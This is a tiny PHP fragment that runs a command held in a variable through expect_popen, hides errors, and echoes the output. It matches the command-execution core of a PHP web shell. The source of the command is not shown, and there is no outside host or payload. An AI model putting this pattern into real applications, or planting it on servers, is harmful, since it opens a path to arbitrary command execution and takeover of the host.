$exec = $_LOCAL;
$f=@expect_popen($exec);
while(!feof($f))echo fread($f, 1024);
@fclose($f);
